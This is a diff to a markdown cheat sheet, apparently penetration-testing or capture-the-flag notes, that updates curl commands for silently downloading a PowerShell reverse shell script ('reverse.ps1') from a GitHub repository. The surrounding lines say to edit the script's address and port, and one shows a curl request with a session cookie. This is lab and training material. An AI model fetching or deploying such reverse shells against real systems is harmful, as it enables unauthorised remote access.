@@ -205,7 +205,7 @@ curl -b PHPSESSID=7lta0l401mm57sh8h63ttrbb9g -v http://10.0.88.33/manage.php/man
 ##### Download a file (follow redirections, save file as remote name)
 
 ```sh
-curl -LO https://github.com/joetanx/oscp/raw/main/reverse.ps1
+curl -sLO https://github.com/joetanx/ctf/raw/refs/heads/main/reverse.ps1
 ```
 
 ##### Upload a file
@@ -554,7 +554,7 @@ Examples: [digitalworld.local-bravery](https://github.com/joetanx/oscp/blob/main
 Download the reverse shell script:
 
 ```sh
-curl -LO https://github.com/joetanx/ctf/raw/main/reverse.ps1
+curl -sLO https://github.com/joetanx/ctf/raw/main/reverse.ps1
 ```
 
 Edit the address and port:
